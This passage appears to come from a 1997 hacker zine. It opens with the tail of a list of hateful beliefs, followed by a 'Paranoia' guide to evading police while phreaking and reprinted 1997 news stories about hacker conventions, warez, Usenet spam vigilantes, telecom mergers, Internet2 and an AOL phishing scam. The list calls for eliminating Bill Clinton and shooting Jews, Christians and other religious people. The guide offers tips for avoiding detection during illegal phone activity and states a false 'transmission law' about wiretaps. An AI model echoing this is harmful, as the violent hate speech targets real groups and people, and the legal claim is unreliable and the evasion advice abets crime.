weak/uninspired/lazy/retarded/handicaped filter themselves out.  It works
 for many other species.
7) I believe 2600 to be a Commercial 'wh0re' of sorts.
8) I believe Bill Clinton is imbred, there for inferior geneticly and should
 be eliminated.  As to avoid Another little Chelsea Clinton
9) I believe if your still reading this, your one sick mother fucker =]
10) I believe I have all the answers and if you follow me you will reach
 a higher state of awareness and enlightment.  I also charge 20 bux an hour
 for group therapy.
11) I think Jews, Christians, and all other ppl "of faith" should be
coralled  up in a cage and shot.  You are weak.  Your religions are all
relics.  You
 are the enemy to the Technological Era.  Im an equal rights discriminator.
 I dont care what religion you are, unless you are a f0kist and follow
f0kism,   you are weak.

I have an article you might consider worth publishing. Here ya go:

                                                      PARANOIA
                                                      ~~~~~~~~~

By: Rebel Logik

For those of you that are not naturally "paranoid" you have my sympathies.
But, buy reading this file you can improve your caution, senses, and
down-right insecurity. 

1. Wear dark clothing: Blues, Blacks etc. etc. Also wear things that hide
your face, hoods, hats etc.

2. Always, always look around you for unwanted types (FEDS, Cops, RCMP, CIA,
NSA) who can usually be pinpointed by wearing a certain type of clothing.
Usually suits, sunglasses, basically just MIB's. These foul beings can
reside anywhere. Your school, your alley, family gatherings (it could easily
be the ones you love most that do you in!", party's and other social places.

3. Always be privy to local escape routes. Such as fireescapes, backdoors
etc. These are handy when encountered with a bust.

4. If you happen to see any law enforcement vechicles or telco vehicles in
your neighborhood cease all illegal activity for a number of days until THEY
are gone.

5. Encrypt your Hard-Drive using some encryption utility. Also, (although
easily cracked) put windows passwords on everything. After a large "project"
burn or destroy excess paper with information.

6. Always Op-Divert, and call from payphones when dialing illegally setup
teleconferences. Be aware that OCI has an ANI!

7. If you think you are being tapped, and cannot be bothered to go to a
payphone: Always talk about bullshit first while discussing an illegal
activity. After 2 or so minutes  of talking about lunch, family members,
cars etc. They will be forced to hang up and stop the tap. This is called
the "transmission" law. If after a certain amount of time (2-5 minutes)if
they still cannot hear you discussing anything of illegal nature they are
FORCED by LAW to quit listening in.

8. Stay away from drugs while doing important things or you'll fuck them up!
Drugs are okay if you want to lie on your coach eating pizza. That's all!
Try to IPSPOOF while stoned and the FEDS are at your door 5 minutes later!

9. When beige boxing or doing anything else that's illegal and phone
related: Always do it at night and in a secluded area. I know this sounds
like common sense but some phreaks.......

Well, I hope you enjoyed this file!
And remember.....

"Even paranoids have real enemies"-Delmore Schwartz

Well, there it is. Respons with yer response. err....

Later,

 Hackers pay Apple its due 
 August 4, 1997  
 BY CHRIS NOLAN
 
 Talk Is Cheap  

 WHEN it comes to Apple, even thieves get sentimental. Some of those who know 
 the company best -- computer hackers -- are urging one another not to 
 download free copies of the company's latest operating system, Mac OS 8. 
 Instead, they say, Apple supporters should pay money for the operating 
 system. [Is it just me, or is this stupid reporter calling warez kiddies
 "computer hackers"? Can't these people tell the fucking difference?]

"I've seen behavior in the pirate community which is alien to say the least," 
writes one "bewildered superuser" in a discussion posted on MacInTouch Reader 
Reports, a Web site for Macintosh supporters and users. "As I looked and 
looked I found not one (illegal) copy of OS 8 GM available anywhere."

Hackers [there it is again] usually pride themselves on their ability to get 
good, new software for free. The faster the hack, the better their ability to 
manipulate computer code and get products or information companies are 
anxious to protect. So, this sudden outbreak of belated good citizenship is, 
well, surprising. It's kind of touching, too.

"I have always fully intended to purchase the new OS even though I could have 
it for free just by waiting until we install it at my company and STEAL it 
then," another Mac user wrote in mid-July, just as talk of former CEO Gil 
Amelio's resignation began. "Apple needs every penny, every sale they can 
cobble together right now."

Writes another MacInTouch reader, one who seems to speak with a bit more 
hacking authority: "Absolutely NO copies of Mac OS 8.0 Golden Master have 
been circulating. This is in contrast to 30-40 sites for download Mac OS 
7.6cd image in the past. This is EXTREMELY good for Apple and I do support 
this movement by some people in the computer underground that have found a 
good conscience." [At least this guy used the term "computer underground"]

 Hackers Frolic in the Woods
 by Mike Tanner 

 6:13pm 8.Aug.97.PDT -- One of the first things participants see upon 
 arriving at HIP 97 - a gathering this weekend of 2,500 members of the 
 international hacking community at a campground about 30 minutes from 
 Amsterdam - is a gravestone engraved with Bill Gates' name and the epitaph 
 "Where do you want to go today?" 

"All the hackers just go crazy when they see that," event coordinator Maurice 
Wessling says of this goad to the fest's resolutely anti-authoritarian 
participants. The marker also serves, however - along with the event's 
willfully obscure location - to increase the sense of the site as underground 
and removed from the routine world. "We are trying to disconnect people from 
their daily whereabouts," Wessling says, "to force them to take a different 
approach to reality." 

HIP - the name stands for Hacking in Progress, a follow-up of sorts to 1993's 
Hacking at the End of the Universe convocation - is a kind of politicized 
Burning Man for hackers, tent-cities and all-night parties included. Its 
technopaganism is skewed pretty far toward the techno side, though. HIP is a 
gathering, says an amused Wessling, where "you'll see these very small 
igloo-like tents with 17-inch monitors in them." 

And unlike the pointed pointlessness of Burning Man, HIP hopes to address 
concrete issues that affect the lives of the participants, such as Internet 
censorship, spam, and, of course, cryptography. Spamming may seem off the 
subject for a group dedicated to abrogating the rules of the Internet, but 
Wessling explains that its proliferation threatens to make the Net unusable, 
while measures to prevent it may lead to censorship. "The essence of HIP is 
that the technical aspect and the political aspect are two sides of the same 
coin," he says. 

This is not to say that elements of hacking's criminal background won't be 
evident at the gathering. There is a tent of German participants present to 
discuss the building of a brute-force DES cracking machine, and a 
presentation Saturday by another German group that recently made headlines 
for exploiting ActiveX security holes to intercept home-banking software. 
Still another demonstration will show how radiation from text on a computer 
screen can be picked up by an antenna and then displayed on another machine. 

But HIP is mainly about how these techniques, and the laws and technologies 
used to address them, will affect the freedom and utility of the online world 
- about how the protocols developed and exposed by hackers now, says 
Wessling, "will be used against us later." 

This direction isn't surprising, considering that HIP administrator Wessling 
is a former writer for a grassroots publisher of books on police and 
intelligence issues. It's also a reflection of the fact that the hacker class 
went from being a bane of the network system to becoming its architects. 
Wessling's salary, in fact, is paid by XS4All, a high-profile Dutch ISP 
itself founded by a group of former hackers. 

Although many hackers have gone corporate, says Wessling, "We still feel the 
urge to do crazy things like this." 

The event's geographical and psychological disconnection is in stark contrast 
to HIP's strikingly powerful electronic connections to the outside world, 
which consist of a microwave beam IP connection to the campground and a 
glass-fiber network connecting 600 participants' computers and growing. 

Organizers have also secured extra transatlantic bandwidth for the event. 
Aside from allowing homebound hackers to be involved in the gathering through 
audio and video feeds to HIP's Web site, it also allows the fest to be 
closely coordinated with the simultaneous Beyond HOPE hackers' conference in 
New York. In fact, HIP was officially opened Friday morning via video link 
from the HOPE site by 2600 magazine editor Emmanuel Goldstein. 

These being hackers, however, all that networking muscle is also being used 
for such things as a long-distance switch to turn a red light at each 
convention location on and off from across the ocean. On a slightly more 
useful front, 10 HIPsters are now working their PCs 24 hours a day building 
what was a small text site into the real-time multimedia hub. "If they do 
something wrong in the coding," says Wessling, "they instantly get three 
emails from all over the world. It's a completely new way of error-checking." 

That the connections work at all is impressive. Richard Thieme, a writer and 
frequent speaker at hacker conventions, points out that at this year's 
version of the venerable DEFCon, organizers were unable to get their T1 
connection to work. Though they stake their reputations on their ability to 
manipulate network technology, says Thieme, hackers are really playing 
catch-up with corporations, which conduct complex video conferences as a 
matter of routine. "These are not professional meeting-planners," he says. 

Whether such get-togethers work with the groups' natural skills, though, 
Wessling believes they are worth the effort: "This is very important, because 
it is one of the rare opportunities for these people to really get together." 

For participant Alfred Heitink, who's using his trip to HIP partly as an 
opportunity to establish an online adoptee network, "It is strange to talk at 
a camping site with people at 7 o'clock about PGP.... That's what makes this 
place so special."

 `Spam' foes tie up Usenet   
 Tuesday, August 5, 1997  
 BY DAVID L. WILSON

 In the old West, Committees of Vigilance arose when there was no legitimate 
 legal authority, enforcing local mores, sometimes with the aid of a noose. 
 Now, electronic vigilantes have leaped into action on the modern-day 
 frontier, the Internet, squelching the ability of hundreds of thousands of 
 people to get their word out on global bulletin boards.

Since Friday evening, a group of computer system administrators has been 
striking back against "spammers" by blocking Usenet messages sent from a 
major Internet service provider. As a result, the vast majority of people who 
rely on UUNET Technologies Inc., one of the largest Internet service 
providers, have been unable since Friday to post messages to Usenet, a kind 
of electronic bulletin board accessible through the Internet. Tens of 
thousands of messages have been blocked by the protest, which continued 
Monday night. 

Usenet is made up of thousands of "newsgroups," each dedicated to a specific 
topic, from Star Trek to mystery novels to the music of Beethoven. Accepted 
practice is that any message posted to a newsgroup must be germane to the 
group. Some people ignore the unwritten etiquette of Usenet, however, and 
post the same message -- usually an advertisement -- in as many newsgroups as 
they can, a process called "spamming." It was not known how many of the 
blocked messages were such ads. 

In recent years, vigilantes have sprung up who cancel such spams on an 
individual basis. This latest incident is unusual, however, because it is 
aimed not at the messages themselves, but at the Internet provider that gives 
the spammers access to Usenet. The action, believed to be by far the most 
far-reaching of its kind in the Internet's history, does not affect the 
ability of UUNET subscribers to send and receive individual e-mail messages 
or use the World Wide Web.

Non-spam blocked, too

 Even so, the scope and indiscriminate nature of the blockage rattled the 
 Internet community. "I'm very much in sympathy because spam really has 
 become an enormous problem, but not all the messages they're blocking are 
 spam," said Mike Godwin, legal counsel for the Electronic Freedom 
 Foundation in San Francisco, which lobbies for free speech on the Net. 
 "This is like dropping a nuclear bomb on a town because you know there's a 
 terrorist living there."

A communique, apparently from the unnamed systems administrators' group 
behind the blockade, was posted on Usenet. It says several people are 
involved in the action against UUNET, and that the action was taken because 
in recent weeks one-third to one-half of Usenet spam has originated with 
UUNET. The communique says the huge volume of spam threatens to destroy the 
network, and that the action was taken only because the company has ignored 
repeated requests from administrators around the world to do something about 
the spam problem. System administrators are persons who oversee computers 
that route messages on the Usenet system.

Officials with UUNET, based in Fairfax, Va., said they would not comment 
until today, however the company's chief executive, John Sidgemore, told the 
Washington Post, "These people are not government agents or the police. They 
have absolutely no right to cancel service on someone else's infrastructure."

 An employee of the company who agreed to comment on condition of anonymity, 
 said, "I can assure you that this company will use every legal means at its 
 disposal to deal with it."

UUNET provides Internet access to about 50,000 subscribers, but not 
individual users, only other Internet service providers. The number of people 
dependent upon UUNET is unknown but could be in the millions.

Individual users would bump into the blockade if their local Internet service 
provider purchases Usenet access through UUNET. Users may not even know that 
their postings are being blocked.

Vowing to continue

 The individuals who helped develop the blockade say they had no choice. "We 
 are convinced this action was necessary to save the Net," said Dennis 
 McClain-Furmanski, a student at Radford University in Radford, Va., who is 
 acting as a spokesman for the group, which numbers about 20. The group has 
 vowed to continue the action until UUNET takes some kind of action to 
 minimize the spam it sends out into Usenet.

While spams have existed almost as long as Usenet, their numbers have 
increased vastly in the last year. And spammers have become sneakier, forging 
fake return addresses, and even forging permission to appear in a "moderated" 
news group, where theoretically only messages approved by a human moderator 
appear.

The vigilantes who are deleting the Usenet contributions are using -- or 
misusing -- a "cancel" feature built into the underlying software on which 
Usenet is based. Theoretically, only the person who posted an article on 
Usenet can issue a cancel command for it.

Once issued, a cancel message races through the computers connected to the 
system around the world, erasing the article. Cancel messages are 
legitimately used by authors who have made a mistake or wish to withdraw an 
article for some other reason.

Because there are no widespread authentication schemes in use on the 
Internet, it is fairly easy to forge a sender's address, however. And there 
are computer programs known as "cancelbots" that can be ordered to forge 
cancel messages against a spam and erase it throughout Usenet. The vigilantes 
use such cancelbots to eliminate spam whenever they spot it.

 Local system administrators can thwart such tactics by disabling the cancel 
 feature on their systems. Therefore, the vigilantes argue, their cancel 
 messages are mere "advisories."

There have long been people who forge cancel messages, and even some 
legendary ``cancel wars'' between people who have attempted to shut each 
other up. But never before have so many users been cut off.

"In military terms, this is acceptable collateral damage," said 
McClain-Furmanski. The amount of Usenet spam coming out of UUNET connections 
was so vast that it could no longer be dealt with by programming the 
cancelbots to eliminate individual messages, he said, so they were programmed 
to eliminate anything that came out of UUNET.

Sean Eric Fagan of San Jose has owned a Usenet site for more than eight 
years. He is not directly participating in the blockade, but is supporting 
the participants. "I moderate the newsgroup comp.std.unix, which gets almost 
nothing but spam these days," he said.

Fagan says everyone involved in the situation understands the danger that the 
power being wielded could be misused. "There's a hazard any time you've got 
somebody trying to enforce standards," he said, "but these people are not 
vigilantes."

Others disagree, however. Godwin said, "Unless they've been deputized, then 
this is vigilante action."

 Netly News - HOPE On A Rope 

 Nothing makes hackers happier than breaking into a computer that another 
 hacker set up, especially when an appreciative audience is watching. Small 
 surprise, then, that there were plenty of grins at last weekend's Beyond 
 HOPE hacker convention in New York City.  

The first break-in attempt came at about 4 a.m. on Friday when a huge, 
tattoo-encrusted Englishman named Cyberjunkie ran a utility that probed the 
network of HOPE's Dutch sister conference, Hacking In Progress. The plan: to 
expose any weaknesses, then peel away the security measures of the target 
computer like the layers of an onion. The program quickly found several 
obvious security holes. "So I had to do something," Cyberjunkie says. "It's a 
bit like waving a red flag at a bull, isn't it?" Like the encierro at 
Pamplona, Cyberjunkie sent a stampede of null information into one of the 
server's memory buffers until it choked and overloaded. Quietly attached at 
the end was a simple script that granted him the access he wanted. (In hacker 
argot, this is known as an IMAP exploit.)  

Because hacking is not only encouraged but rewarded at HOPE -- which 
conference organizer Emmannuel Goldstein revived this summer after a 
three-year hiatus -- each of the thousands of participants received an IP 
address with which they could glom onto the Puck Building's 10-megabit 
network and connect to the rest of the world. The Pittsburgh-based DataHaven 
Project provided 15 public terminals, but Ethernet hub plugins were 
plentiful. Confused? No problem. The 13-year-old with braces in the next 
chair was glad to help out. After all, he'd already hooked his ancient DEC, 
Hewlett-Packard or portable IBM onto the Net and was busily trying to gain 
root access.  

When you'd tired of chatting on IRC #hope (topic at 4:11 p.m. on Saturday: 
"HOPE is a commercial enterprise full of bull"), you could browse through the 
various kinds of phone equipment, T-shirts or software that were on sale. 
Ether Bunny sold $250 worth of lineman's equipment (including several 
Southwestern Bell hard hats) in just over an hour. There was, of course, a 
constant stream of panels to attend: Tiger Teaming (better known as security 
consulting); cryptography; how to hack Windows NT; Metrocard hacking; a 
prisoner panel that included Bernie S. and Phiber Optik; and an amazing talk 
on privacy given by investigator Steve Rambam.      

Best known for tracking down 161 Nazi war criminals hiding in Canada, Rambam 
is a consummate connoisseur of databases. "It is true that I can go online 
and reliably determine if you are a homosexual or a lesbian. It is true that 
I can go online and determine your religion. I can go online and, without 
breaking a sweat or getting carpal tunnel syndrome, find what movies you rent 
at Blockbuster," he said.  

Yet Rambam takes an unlikely stance on the privacy issue, especially in a 
room full of paranoids. Closing off databases, he says, will not adversely 
affect his work -- since he'll always be able to buy the information from 
someplace. "It will harm the ability of the average person to control their 
lives; to check up on government to see if they are lying to him, to check up 
on big business to see if they are lying to him, to check up on the guy next 
door and see if he is an ax murderer," he said.  

Now Rambam may be biased, for he operates a billion-record database that is 
accessible online to subscribers (he refused to give the URL for fear of 
hacking attacks). Nevertheless, it was rare to see so many teenagers taking 
copious notes, noted fellow attendee Shabbir Safdar. The audience couldn't 
get enough of Rambam, who looked more like a fed than a hacker in his 
custom-made Hong Kong suit. (A big hit was when he detailed how to turn a 
dead man's identity into your own.) But ultimately, Rambam questioned why 
anyone would want to: "The fact of the matter is that there is no real reason 
to hide most of who you are and what you do."  

It's an unfortunate but true statement about the state of hacking today. 
Where have all the good hacks gone? Three years later and the flimsy 
Metrocard is still impenetrable. A panel of hackers turned security 
consultants showed that one of the biggest challenges for today's data 
cowboys was changing the preconceived notions of hackers held by the 
corporations they work for.  

Keynote speaker Brock Meeks, went so far as to admonish the crowd for their 
low hacker batting average (only 20 percent of all government computer 
systems have been hacked). His address was putatively a history of hacking in 
America, but it sounded more like a call to arms for the audience. "You're 
going to have to learn how to hack the media, because you haven't been doing 
a good job of it," Meeks said.  

Indeed, hackers get their share of bad press, and they gripe about it to no 
end. And HOPE highlighted the split personality hackers bring to their 
relationship with the media. Like most groups, they lambaste journalists. Yet 
their keynote speaker wasn't an agent provocateur, but a member of the press 
(albeit an esteemed one who champions the hacker cause). There was a panel 
discussion (which I participated in) where hackers could finally turn the 
tables on the media in attendance. "No weapons allowed," said the schedule of 
events. Yet only one of the audience's questions criticized the press, 
specifically noting John Markoff and his book on Kevin Mitnick. There was 
even a "Media Portrayal of Hackers" survey being distributed by a University 
of Tennessee sociology student as part of his master's thesis.  

Perhaps it's useless to analyze hacker-vs.-media steretypes. After all, the 
hacker community has shown that it can successfully run its own magazines, 
pirate radio stations and web sites. If it's true that information technology 
is going to obliterate old media, the horsemen of the apocalypse are more 
likely riding from alt.2600 than from Wired. "The whole 2600 thing is a media 
hack," admitted Goldstein. And the success of this year's HOPE showed not 
only that Goldstein knows how to co-opt the media but that he might be a damn 
good entrepreneur as well.

 Bell Atlantic-Nynex Merger Gets Final OK 
 (08/14/97)
 By Kora McNaughton, TechInvestor

 WASHINGTON -- The Federal Communications Commission Thursday approved the 
 merger of Nynex and Bell Atlantic, creating the second-largest phone company 
 in the United States. 

Although the FCC's blessing was not altogether unexpected, Wall Street 
welcomed the news, pushing both companies' stock up after the late afternoon 
announcement. Bell Atlantic [BEL] gained 1 1/4 to close at 75 15/16; Nynex 
[NYN] closed up 1 1/8 at 58 1/16. 

Last month, after the two companies proposed conditions designed to promote 
competition in their markets, the agency's chairman, Reed Hundt said he was 
ready to approve the deal. Hundt stumped for a new telecommunications law on 
Thursday. 

In a joint announcement, Nynex and Bell Atlantic said they are "pleased" that 
the agency unanimously agreed to the merger, which will close "as soon as 
possible." 

The $23 billion merger, first announced in April of 1996, will create a phone 
company with a presence in markets covering most of the Eastern seaboard, 
serving 40 million phone access lines and 5.5 million wireless customers. It 
will be headquartered in New York. 

Since the merger was announced, Bell Atlantic and Nynex have been dancing 
with regulators on both the Federal and local levels. 

Commissioner Rachelle B. Chong said in a statement Thursday the FCC approved 
the deal "only after a very careful analysis of the likely market effects of 
the merger, and the imposition of certain enforceable pro-competitive 
conditions to help ensure that the local network is opened -- and stays 
opened -- to new competitors." 

The conditions include providing detailed performance reports to competitors 
and regulators, offering interconnection, network element, transport, and 
termination at rates based on forward-looking economic costs, and offering 
shared transport priced by the minute and routed just as Bell Atlantic's own 
traffic, without access charges. 

Bell Atlantic and Nynex proposed the conditions July 19, one day after the 
Eighth U.S. Circuit Court in St. Louis ruled that the FCC had exceeded its 
authority by trying to set the prices new entrants will pay for access to 
local phone networks. The Baby Bells built the networks, but now must share 
them with competitors. 

Long-distance companies such as AT&T and MCI have accused the RBOCs of 
delaying required upgrades to the local networks to allow for competition; 
earlier this week, MCI complained Nynex was taking too long to process orders 
for MCI local service in New York, thereby slowing MCI's growth in that 
region. 

In a statement after the ruling Thursday, MCI Chief Policy Counsel Jonathan 
Sallet praised the FCC. "The conditions that have been announced today and 
that will be enforced by the FCC will help to alleviate the anticompetitive 
impact of the Bell Atlantic-Nynex merger," he said.

 Getting Ready For Internet2 
 (08/18/97)
 By Larry Lange, Electronics Engineering Times

 ANN ARBOR, Mich. -- The effort to build Internet2--an academic and 
 government research-only network separate from the increasingly 
 commercialized Internet--is kicking into high gear following a series of 
 technical meetings this summer.

The effort is rapidly picking up participants from universities that want to 
log on to the proposed high-speed, multimedia-oriented network. And 
communications OEMs are eyeing Internet2 as an ideal test bed for their 
next-generation systems. 

Having completed a critical technical workshop here early this month and one 
in July in Denver, the Internet2 organization is pushing to meet its 
self-imposed deadlines for bringing its network live by year's end, with 
three university members to be connected as early as this month. 

The network promises benefits for commercial as well as academic Internet 
users. Obviously, offloading institutional traffic from the commercial 
Internet will speed transmissions for both Internet and Internet2 users. 

But the "I2" will also "speed the development of new network features and 
functionality," said Charles Lee, senior manager of Internet2 interests for 
MCI Communications Inc. Those features and functions "could then be 
incorporated into the commercial Internet," Lee said. 

The work is coming at a time when the underlying base technology of the 
Internet Protocol is being pulled in many directions. In this environment, 
communications OEMs are eager for a safe haven to test out future 
technologies. 

"Internet2 will provide a large-scale environment to try out new ideas and 
equipment running at speeds faster than any in operation with an intellectual 
community of users," said Stephen Wolff, director of business development for 
Cisco Systems Inc., a participant in the project. 

The Internet2 organization has grown from 34 members at its October inception 
to more than 100 research universities today. Notable government 
representatives hail from the U.S. Department of Energy and the National 
Science Foundation (NSF, Arlington, Va.). Several members are already 
engineering prototype network facilities, with the project's initial 
operations expected to begin by year's end. 

"We originally thought only 20 to 30 of the major research universities had 
such a high priority for continuing to build their network infrastructure 
that they would join the project," said Internet2 director Mike Roberts of 
Educom, a consortium of universities that promotes the use of information 
technology in education and research. "Obviously, we were wrong." 

So far, Internet2 university members have committed up to $50 million per 
year in new funding for the project, and the commercial sector--with project 
representation from such companies as Cisco, Lucent Technologies, Sun 
Microsystems, IBM, AT&T and Microsoft--has pledged more than $5 million. By 
contributing funding to university partners, the corporations can tap the 
project as a testbed for unproven Internet technologies--a task that's 
difficult to undertake on today's overcrowded Internet. 

Internet2 organizers are working with representatives from IBM, MCI, Cisco 
and other internetworking companies to discuss the needs of the system 
architects developing the advanced Internet2 nodes called Gigapops (points of 
presence)--the network aggregation points for the second-generation Internet 
wide-area network. 

Ted Hanss, director of applications development for the Internet2 project, 
told EE Times that such applications-enabling technologies as security, 
multicast and quality of service were among the important topics discussed at 
the summer meetings. The applications heading the list for I2 are 
collaborative environments, digital libraries, tele-immersion, tele-medicine 
and distance-independent instruction, Hanss said. 

Internet2 engineers have officially settled on an architecture of 
connectivity through Gigapops, which can swiftly connect the campuses, labs 
and, later, the urban-area and state/regional networks envisioned by the 
Clinton administration's Next-Generation Internet (NGI) initiative. 

Accordingly, Internet2 engineers look to deliver 622-Mbit/second 
transmissions to three supercomputer centers, running the Internet Protocol 
(IP) over an asynchronous-transfer-mode (ATM) network. And they want to boost 
bandwidth by nearly 14 percent for the University of Illinois National Center 
for Supercomputer Applications (NCSA), the San Diego Supercomputer Center and 
the Pittsburgh Supercomputer Center, with the promise of 20 more universities 
to be linked by this fall to Gigapops that will deliver data at speeds of at 
least 155 Mbits/s. (Current commercial transmission speeds top out at 45 
Mbits/s.) 

Other Internet2 project members have laid the foundations for connectivity to 
the network based on its anticipated speeds. A group of universities in 
California recently announced the building of an Internet2 network that will 
be designed to connect campuses at speeds of over 600 Mbits/s. 

"The electronic highway is faced with rush-hour traffic most of the day. We 
need reliable service delivery," said M. Stuart Lynn, associate vice 
president at the University of California and the principal investigator for 
the project. 

The participating schools include seven campuses of the University of 
California, along with the California Institute of Technology, California 
State University, Stanford University and the University of Southern 
California. Notable goals for the project will be the formation of a virtual 
university in which students can view publications from distant libraries and 
take classes located at other campuses. 

Internet2 is systematically swallowing up the National Science Foundation's 
Very High-Performance Backbone Network Service (vBNS). More than 50 Internet2 
institutions have received competitively awarded vBNS grants under the NSF's 
High Performance Connections program. 

In fact, vBNS could be considered the heart of Internet2, or at least its 
substantive launchpad. Begun in 1995, with an investment of $50 million under 
a five-year cooperative project with MCI, the service links six NSF 
supercomputer centers and was initially implemented to design and support 
"gigabit testbeds" for R&D of advanced networking technologies. The centers 
are located at the Cornell Theory Center, at NCSA and elsewhere. 

Those technologies included ATM/Sonet, the interfacing of ATM to the High 
Performance Parallel Interface and HiPPI switches, and all-optical 
networking. Each testbed addressed an application that required gigabit-speed 
networks. 

The trunk-line infrastructure for true broadband services to academia is 
being defined at a time when the core protocols for the Internet are being 
upgraded from the original transport and network protocols developed by the 
Advanced Research Projects Agency (now Darpa) in the 1980s. 

NSF program director Mark Luker said many of the problems restricting the 
commercialization of the original Internet "should be solved within the next 
few years using Internet2." Once traditional not-for-profit users move to the 
new network, Luker said, "it will be easier to implement pay schemes and give 
incentives to finance further Internet growth." 

Luker's comments underscore one of the motivations behind the 
administration's NGI initiative: relieving the current Internet's bandwidth 
bottlenecks. 

"This is an ongoing proposition. It won't stop with Internet2. I see an 
Internet3 and 4 in the near future," Luker said. By the end of 1998, 
Internet2 looks to have nearly all participating universities employing 
stable Internet2 connections. 

Projects under development with Internet2, Luker said, include digital 
multimedia libraries accessible in virtual reality, enhanced collaborative 
workplace communities with live digital video feeds, videoconferencing, 
collaborative computer-integrated manufacturing, weather forecasting and 
military-troop-movement monitoring. 

A briefing on Internet2 by the NASA Ames Research Center at Moffett Field 
(Mountain View, Calif.) drew more than 60 companies. "Although much of the 
research needed to make a new, superfast Internet is too risky and long-term 
for the private sector, our success will depend on partnerships with private 
industry and universities," Christine Falsetti, NGI project manager at Ames, 
said. 

NASA recently designated Ames the lead institution for the agency's $30 
million portion of a three-year, $300 million federal project to develop the 
NGI. "We want a network for researchers that is fast from end to end. And we 
will work with private companies on routers, switchers and computer 
workstations that will send computer information much faster than today's 
machines can send it," Falsetti said. 

One NASA goal is to create "co-laboratories" by linking labs, computers, 
databases and scientists from around the world via I2. Ames is organizing a 
September workshop for companies interested in such emerging applications. 

The NGI initiative was unveiled in October with three basic goals: to connect 
universities and national labs with high-speed networks that would be 100 to 
1,000 times faster than the commercial Internet; to promote experimentation 
with advanced multimedia technologies, such as real-time videoconferencing; 
and to demonstrate new applications that support scientific research, 
national security, distance education, environmental monitoring and health 
care. 

On the campaign trail, the Clinton administration promised $100 million in 
funding for its initiative. The funds are set for release in January. 

Internet2 spokesmen are quick to say that the network is not designed to 
replace the existing public Internet or to sidestep the NGI initiative. "The 
goals of Internet2 and of the NGI are entirely compatible and complementary," 
said Douglas Van Houweling, vice chairman of Internet2. "There is a 
compelling unanimity of purpose and direction." 

Yet Internet2 is not without its critics. There have been suggestions, for 
instance, that universities are leveraging the project to maintain a separate 
network presence. 

But Internet2 Steering Committee member Raman Khanna disputed that assertion. 
"At Stanford, where I work, only 15 percent of Internet traffic goes toward 
other universities," Khanna said. "The other 85 percent connects the school 
to the rest of the commercial network. Even if academia were to isolate its 
future, high-speed network system, it would speed up only 15 percent of its 
Internet traffic." 

Khanna also noted that the high-speed network is merely for the development 
of advanced applications and that any advances made will be available to all 
Internet users in three to five years. 

Another point of controversy is the government's role in funding specific 
university projects though Internet2. Several high-level lawmakers complained 
at recent Senate hearings that the NGI program favors urban areas and large 
universities. 

But Neal Lane, director of the National Science Foundation, said that 
Internet2 "is not an established infrastructure like a highway. It is a work 
in progress . . . and it is experimental. 

"That is the reason we need the nation's researchers to help us move 
forward." 

It remains to be seen whether the Internet2 body can pull off its monumental 
project and then seamlessly bring the network into line with the commercial 
Internet and provide bandwidth and multimedia solutions for the NGI, all by 
the slated deadline of 2000. If it can, the project will look to realize even 
more impressive goals. 

Internet2 plans to share discoveries with others in education worldwide. 
"This is the approach that characterized the first Internet," said NSF's 
Luker, "and it can work again with Internet2."

 AOL urges its members to protect themselves    
 August 26, 1997
 By Franklin Paul

 NEW YORK (Reuter) - America Online Inc.'s subscribers can do as much, if not 
 more than the company can, to protect themselves from online theft and 
 fraud, a company executive said Tuesday following a recent scam.

The world's largest online service says smart members can do more to keep 
their personal information private than could any protective software program 
or lurking online police.

"If you want to protect yourself, you need to protect your personal 
information," Tatiana Gau, AOL's vice president of integrity assurance, said 
in an interview.

"We have a three-pronged approach; to educate, empower and enforce, where we 
put the tools in the hands of our members to allow them to protect 
themselves," against those who would take personal information to commit 
crimes like credit card fraud, she said.

The approach includes frequently reminding the service's more than 8 million 
members that AOL staff members will never ask for password or billing 
information, and telling them where to go to report a scam in action.

"People are beginning to realize that the same kind of scams that occur in 
real life do occur online," Gau said. "So in the same way in real life you 
would never dream of giving out your PIN number to your ATM card, you 
shoudn't be doing it online either."

Earlier this month, a scam was perpetrated on AOL whereby members received 
electronic mail that invited them to jump to a Web page which contained text 
of a letter from AOL Chairman Steve Case.

From there, another link asked members to enter billing information. Thinking 
they were providing data to AOL, they were really handing their vital 
information to thieves.

While Gau would not say how many members were duped by the scam, or if the 
perpetrators were caught, she said it was other AOL members that fingered the 
crooks.

"It was literally within a matter of hours of the mail being sent out that 
the e-mail was forwarded to us, which allowed us to very quickly get the site 
shut down," she said.

"The billing scam ... is really testimony to the fact that our ... mechanisms 
are working," she said.

She adds that the company's other security measures include adding alerts to 
the first screen that members see when they sign on and putting e-mail with 
safety tips in the mailboxes of new members.

AOL also urges members not to download files from sources they are unfamiliar 
with and it makes available free anti-virus software.

AOL's stock fell $1 to close at $66 on the New York Stock Exchange.
